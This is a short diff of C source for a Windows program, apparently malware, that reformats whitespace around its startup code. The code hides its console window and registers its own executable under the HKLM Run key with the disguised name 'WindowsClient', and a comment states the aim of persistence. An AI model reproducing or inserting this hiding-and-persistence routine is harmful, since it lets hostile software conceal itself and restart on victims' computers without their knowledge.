@@ -16,7 +16,7 @@ int main(const int argc, const char* argv[]){
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     // == Add self into run reg key - ensures some persistence
     // = Open the run key
-	HKEY hKey;
+    HKEY hKey;
     LONG lResult = RegOpenKeyEx(
         HKEY_LOCAL_MACHINE,
         TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
@@ -28,14 +28,14 @@ int main(const int argc, const char* argv[]){
     char szPath[MAX_PATH];
     DWORD dwSize = GetModuleFileName(NULL, szPath, MAX_PATH);
     // = Edit the run key
-	lResult = RegSetValueEx(
-		hKey,
-		TEXT("WindowsClient"),
-		0,
-		REG_SZ,
-		(BYTE*)szPath,
-		dwSize
-	);
+    lResult = RegSetValueEx(
+	    hKey,
+	    TEXT("WindowsClient"),
+	    0,
+	    REG_SZ,
+	    (BYTE*)szPath,
+	    dwSize
+    );
     // = Close the run key
 	RegCloseKey(hKey);
     
